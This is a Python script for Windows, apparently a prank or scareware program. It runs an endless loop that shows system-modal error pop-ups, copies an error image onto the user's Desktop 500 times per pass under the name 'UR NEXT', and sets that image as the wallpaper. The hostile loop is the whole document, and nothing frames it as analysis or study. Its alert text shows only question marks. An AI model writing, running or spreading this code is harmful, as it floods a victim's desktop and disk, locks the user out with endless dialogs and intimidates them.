import time
import pymsgbox
import os
import shutil
import ctypes
try:
    while True:
        pymsgbox.alert(icon=4096 + 16, text="????????????????", title="????????????????")
        dpath = os.environ["USERPROFILE"] + "/Desktop/"
        if os.path.exists(os.environ["USERPROFILE"] + "/OneDrive/"):
            dpath = os.environ["USERPROFILE"] + "/OneDrive/Desktop/"
        for i in range(500):
            shutil.copy(r"C:\windows\system32\securityandmaintenance_error.png", dpath + "UR NEXT " + str(i) + ".png")
        ctypes.windll.user32.SystemParametersInfoW(20, 0, r"C:\windows\system32\securityandmaintenance_error.png", 0)
except Exception:
    pymsgbox.alert(icon=4096 + 16, text="????????????????", title="????????????????")
    dpath = os.environ["USERPROFILE"] + "/Desktop/"
    if os.path.exists(os.environ["USERPROFILE"] + "/OneDrive/"):
        dpath = os.environ["USERPROFILE"] + "/OneDrive/Desktop/"
    for i in range(500):
        shutil.copy(r"C:\windows\system32\securityandmaintenance_error.png", dpath + "UR NEXT " + str(i) + ".png")
    ctypes.windll.user32.SystemParametersInfoW(20, 0, r"C:\windows\system32\securityandmaintenance_error.png", 0)